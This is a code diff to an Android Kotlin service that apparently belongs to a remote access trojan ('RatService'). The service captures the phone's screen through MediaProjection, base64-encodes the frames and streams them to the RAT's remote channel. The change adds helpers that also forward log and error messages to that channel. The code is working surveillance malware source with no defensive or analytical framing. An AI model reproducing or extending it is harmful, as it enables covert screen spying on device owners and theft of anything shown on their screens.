@@ -35,11 +35,20 @@ class ScreenStreamService : Service() {
     private var handler: Handler? = null
     private var frameCount = 0
 
+    private fun slog(msg: String) {
+        Log.i(TAG, msg)
+        RatService.instance?.sendLog(TAG, msg)
+    }
+    private fun elog(msg: String) {
+        Log.e(TAG, msg)
+        RatService.instance?.sendLog(TAG, "ERR: $msg")
+    }
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.i(TAG, "onStartCommand")
+        slog("onStartCommand")
 
         if (isStreaming) {
-            Log.i(TAG, "Already streaming — stop dulu")
+            slog("Already streaming — stop dulu")
             stopSelf()
             return START_NOT_STICKY
         }
@@ -50,7 +59,7 @@ class ScreenStreamService : Service() {
         intervalMs = interval
 
         if (!ScreenCapture.isReady()) {
-            Log.e(TAG, "❌ MediaProjection NOT ready")
+            elog("MediaProjection NOT ready — abort")
             stopSelf()
             return START_NOT_STICKY
         }
@@ -94,7 +103,7 @@ class ScreenStreamService : Service() {
             val height = (metrics.heightPixels * scale).toInt()
             val dpi = (metrics.densityDpi * scale).toInt()
 
-            Log.i(TAG, "Virtual display ${width}x${height}")
+            slog("Virtual display ${width}x${height}")
 
             imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
 
@@ -107,9 +116,13 @@ class ScreenStreamService : Service() {
                 handler
             )
 
-            Log.i(TAG, "✅ Virtual display created")
+            if (virtualDisplay == null) {
+                elog("createVirtualDisplay returned null")
+            } else {
+                slog("Virtual display created")
+            }
         } catch (e: Exception) {
-            Log.e(TAG, "startVirtualDisplay error", e)
+            elog("startVirtualDisplay exception: ${e.message}")
         }
     }
 
@@ -143,23 +156,23 @@ class ScreenStreamService : Service() {
                     val sent = RatService.instance?.sendFrame("screen_frame", b64) ?: false
 
                     if (frameCount % 20 == 0) {
-                        Log.i(TAG, "Frame #$frameCount sent=$sent size=${b64.length}")
+                        slog("Frame #$frameCount sent=$sent size=${b64.length}")
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "encode error", e)
+                    elog("encode error: ${e.message}")
                 } finally {
                     try { image.close() } catch (_: Exception) {}
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "loopCapture error", e)
+            elog("loopCapture exception: ${e.message}")
         }
 
         handler?.postDelayed({ if (running) loopCapture() }, intervalMs)
     }
 
     override fun onDestroy() {
-        Log.i(TAG, "onDestroy — frames=$frameCount")
+        slog("onDestroy — frames=$frameCount")
         running = false
         isStreaming = false
         try { virtualDisplay?.release() } catch (_: Exception) {}
